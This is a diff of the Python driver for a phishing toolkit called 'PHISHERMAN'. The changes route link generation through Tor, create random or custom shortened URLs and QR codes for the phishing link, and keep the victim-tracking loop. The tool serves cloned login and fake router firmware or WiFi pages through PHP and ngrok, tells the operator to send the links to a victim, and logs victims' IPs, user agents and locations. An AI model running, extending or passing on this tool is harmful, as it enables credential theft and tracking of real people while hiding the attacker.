@@ -1,30 +1,54 @@
-#!/usr/bin/python3
+#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
 import subprocess
 from sys import exit
 from src.termcolor import colored
 import platform
+from base64 import b64decode
 from zipfile import ZipFile
-from os import walk,path,getcwd
+from os import walk,path,getcwd,mkdir,remove
 import threading
 from datetime import datetime
-from json import loads
-from urllib.parse import quote
 from src import requests
-from time import sleep
+from src.torpy.http.requests import TorRequests
     
 try:
     subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
 except:
-    print('PLEASE INSTALL PHP BEFORE STARTING PHISHERMAN')
+    print(colored('[*] PLEASE INSTALL PHP BEFORE STARTING PHISHERMAN','red',attrs=['bold']))
     exit()
 
 def get_my_ip():
     
     return requests.get('https://api.ipify.org/?format=json').content.decode('utf8').split(':')[-1][1:-2]
 
-def shorten(url):    
+def shorten(url,vpn):    
     
-    return requests.post('http://lnkiy.com/createShortLink',data={"link":""+url}).content.decode('utf8').split('++')[0]
+    inter = vpn.post('http://lnkiy.com/createShortLink',data={"link":""+url}).content.decode('utf8')
+    if '++' in inter:
+        return inter.split('++')[0]
+    else:
+        print(inter)
+        return '[*] Error generating random shortened URL'
+    
+def custom_short(url,c,vpn):
+    
+    inter = vpn.post('http://lnkiy.com/createCustomUrl',data={"linld":""+url,"slink":""+c}).content.decode('utf8')
+    if '++' in inter:
+        return inter.split('++')[0]
+    else:
+        return '[*] Error generating custom shortened URL'
+
+def qrcode(url,server,vpn):
+    
+    if not path.isdir('qrcodes'):
+        mkdir('qrcodes')
+    if 'lnkiy' in url:
+        c = vpn.get(url+'-qrcode',allow_redirects = True).content.decode('utf8').split('<img height="300px" width="300px" src="')[-1].split('"/>')[0]
+        open('qrcodes/'+server+'-qr.png','wb').write(b64decode(c.split(',')[-1]))
+        return 'qrcodes/'+server+'-qr.png'    
+    else:
+        open('qrcodes/'+server+'-qr.png','wb').write(requests.get('https://chart.apis.google.com/chart?cht=qr&chs=300x300&chl='+url+'&chld=H|0').content)
+        return 'qrcodes/'+server+'-qr.png'   
 
 
 def ngrok():
@@ -34,7 +58,7 @@ def ngrok():
     except:
         pass
     if (1):
-        print(colored('[*] Preparing to download ngrok','red',attrs=['bold']))
+        print(colored('[*] Downloading ngrok','red',attrs=['bold']))
         if platform.system() == 'Darwin':
             r = requests.get('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip',allow_redirects=True).content
             open('ngrok-zip.zip','wb').write(r)
@@ -55,42 +79,57 @@ def start_php(server):
     subprocess.Popen(['php','-S', '127.0.0.1:3030','-t','sites/'+server],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
 
 def refresh():
-    if 1:
-        while 1:
-            for root, dirs, files in walk(getcwd()+'/sites/'):
-                for file in files:
-                    if file in ('ip.txt','redir.txt','victims.txt'):                        
-                        open(path.join(root, file),'w+')                        
-            else:
-                break
+    for root, dirs, files in walk(getcwd()+'/sites/'):
+        for file in files:
+            if file in ('ip.txt','redir.txt','victims.txt'):                        
+                open(path.join(root, file),'w+')                        
+    for root, dirs, files in walk(getcwd()+'/qrcodes/'):
+        for file in files:
+            remove('qrcodes/'+file)
 
-def attack(server,url,wifi):
+def attack(server,url,wifi,custom,qr):
         
     t1 = threading.Thread(target=start_ngrok)
     t2 = threading.Thread(target=start_php,args=[server])
     t1.setDaemon = True
     t2.setDaemon = True
     print()
-    print(colored('[*] Starting ngrok....','green',attrs=['bold']))    
-    t1.start()    
     print(colored('[*] Starting php server....','green',attrs=['bold']))  
     t2.start()      
+    print(colored('[*] Starting ngrok....','green',attrs=['bold']))    
+    t1.start()        
     if '/' not in server:        
         open(getcwd()+'/sites/'+server+'/redir.txt','w+').write(url)
     elif wifi:
         open(getcwd()+'/sites/'+server+'/wifi.txt','w+').write(wifi)
+    print(colored('[*] Initiating Tor....','green',attrs=['bold']))    
     my_ip = [get_my_ip().strip(' ').strip('\n')]
-    while 1:    
-        try:
-            link = get_link()
-            shortened = shorten(link)            
-            #shortened = ''
-            break
-        except:
-            continue
-    print()
-    print(colored('[*] Send any of these links to victim  :  \n\n','green',attrs=['bold'])+colored(link+'\n'+shortened,'red',attrs=['bold']))
-    print()    
+    with TorRequests() as tor_requests:
+        with tor_requests.get_session() as sess:
+            print(colored('[*] Generating links....','green',attrs=['bold']))    
+            while 1:    
+                try:
+                    link = get_link()  
+                    qrc = ''
+                    if custom:
+                        shortened = custom_short(link,custom,sess)
+                        if '://' not in shortened:
+                            shortened += '\n'+shorten(link,sess)
+                    else:
+                        shortened = shorten(link,sess)
+                    if qr:
+                        if '://' in shortened:
+                            ur = shortened if '\n' not in shortened else shortened.split('\n')[-1]
+                            qrc = '[*] QR Code for '+ur+' saved at '+qrcode(ur,server,sess)
+                        else:
+                            qrc = '[*] QR Code for '+link+' saved at '+qrcode(link,server,sess)
+                    break
+                except Exception as e:
+                    print(e)
+                    return
+            print()
+            print(colored('[*] Send any of these links to victim  :  \n\n','green',attrs=['bold'])+colored(link+'\n'+shortened+'\n'+qrc,'red',attrs=['bold']))
+            print()    
     if '/' not in server:
         ztop = 0
         print(colored('[*] Waiting for victim to open the link....','yellow',attrs=['bold']))
@@ -103,16 +142,21 @@ def attack(server,url,wifi):
                         if '.' in r or ':' in r and r not in my_ip:
                             f.seek(0)                            
                             re=f.read().split('\n')         
-                            my_ip.append(re[0])                                                 
-                            try:
-                                df = ip_details(re)
-                                if not df:
+                            if re[0].upper() != 'UNKNOWN':
+                                my_ip.append(re[0])                                                 
+                                try:                                
+                                    df = ip_details(re)
+                                    if not df:
+                                        continue                                    
+                                except:
                                     continue
-                            except:
-                                continue
-                            print()
-                            my_ip = re[0]
-                            ua=re[2]
+                                my_ip = re[0]
+                                ua = re[2]
+                            else:
+                                print(colored('[*] IP address of victim is unknown','red',attrs=['bold']))
+                                my_ip = re[0]
+                                ua = re[0]
+                            print()                            
                             ztop = 1
                             f.close()
                             f = open(path.join(root, file),'w+')
@@ -157,8 +201,7 @@ def ip_details(lis):
         "User-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36"
     }
     url = 'http://ip-api.com/json/'+ip.strip('\n')
-    r = requests.get(url,headers=headers).content.decode('utf8')
-    dic = loads(r)
+    dic = requests.get(url,headers=headers).json()
     if 'AWS' in dic['org']:
         return 0
     print()
@@ -302,7 +345,7 @@ def main():
         redir_url = input(r)
         if not redir_url:
             redir_url = links[server]
-        attack(server,redir_url,'')
+        wifi_model = ''
     else:
         sub_servers = {
             1 : 'firmware-upgrade',
@@ -326,16 +369,20 @@ def main():
                 print(colored('[*] Invalid choice','yellow',attrs=['bold']))
         if ch_sub == '1':
             print()
-            wifi_model = input(colored('[*] Enter the model of the target router ','green',attrs=['bold'])).upper()
+            wifi_model = input(colored('[*] Enter the brand of the target router ','green',attrs=['bold'])).upper()
         elif ch_sub == '3':
             print()
             wifi_model1 = input(colored('[*] Enter the AP name of the target router ','green',attrs=['bold']))
             wifi_model2 = input(colored('[*] Enter the encryption type of the target router ','green',attrs=['bold']))
-            wifi_model = wifi_model1.upper()+':'+wifi_model2.upper()
-        attack(server,redir_url,wifi_model)
+            wifi_model = wifi_model1.upper()+':'+wifi_model2.upper()        
+    print()
+    custom = input(colored('[*] Enter a custom shortened URL name (leave empty to generate a random shortened URL) ','green',attrs=['bold']))
+    print()
+    qr = input(colored('[*] Do you want to generate a QR Code for the link (Y/N)? '))
+    qr = 1 if qr.upper() == 'Y' else 0
+    attack(server,redir_url,wifi_model,custom,qr)
 
-if __name__ == '__main__':
+if __name__ == '__main__' and platform.system().upper() != 'WINDOWS':
     
     refresh()
-    main() 
-            
+    main()     
